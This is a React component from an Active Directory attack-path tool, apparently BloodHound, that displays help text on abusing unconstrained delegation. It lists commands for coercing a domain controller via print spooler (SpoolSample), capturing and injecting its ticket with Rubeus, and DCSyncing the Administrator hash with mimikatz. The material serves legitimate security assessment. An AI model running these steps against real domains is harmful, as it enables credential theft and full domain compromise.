// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';
import CodeController from '../CodeController/CodeController';

const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType }) => {
    const intro = (
        <>
            <Typography variant='body2'>
                A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using
                the printspooler.
            </Typography>
            <Typography variant='body2'>
                The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of
                those principals will not be sent to the principal with unconstrained delegation. You can find all the
                protected principals with this Cypher query:
            </Typography>
            <CodeController>
                {`MATCH (g:Group)
                WHERE g.objectid ENDS WITH "-525"
                MATCH (n:Base)
                WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
                RETURN n
                LIMIT 1000`}
            </CodeController>
            <Typography variant='body2'>
                There are many other coercion techniques than printspooler that can be used (see References).
            </Typography>
        </>
    );

    if (sourceType == 'Computer') {
        return (
            <>
                {intro}
                <Typography variant='body1'>Step 1: Start monitoring for TGTs</Typography>
                <Typography variant='body2'>
                    Log in on the {sourceName} computer configured with unconstrained delegation and open CMD as
                    Administrator.
                </Typography>
                <Typography variant='body2'>Start monitoring for incoming TGTs using Rubeus:</Typography>
                <Typography component={'pre'}>
                    {'Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap'}
                </Typography>

                <Typography variant='body1'>Step 2: Coerce target DC</Typography>
                <Typography variant='body2'>
                    From any host in the domain, coerce the target DC using SpoolSample:
                </Typography>
                <Typography component={'pre'}>
                    {'SpoolSample.exe targetdc.domain.local uncondel.domain.local'}
                </Typography>
                <Typography variant='body2'>Rubeus will print the DC TGT as it is received.</Typography>
                <Typography variant='body2'></Typography>

                <Typography variant='body1'>Step 3: Pass the Ticket</Typography>
                <Typography variant='body2'>
                    Inject the DC TGT into memory using Rubeus on any computer in the domain:
                </Typography>
                <Typography component={'pre'}>{'Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...'}</Typography>

                <Typography variant='body1'>Step 4: DCSync target domain</Typography>
                <Typography variant='body2'>
                    Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:
                </Typography>
                <Typography component={'pre'}>
                    {'lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator'}
                </Typography>
            </>
        );
    } else {
        return (
            <>
                {intro}
                <Typography variant='body2'>
                    See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the
                    execution.
                </Typography>
            </>
        );
    }
};

export default WindowsAbuse;
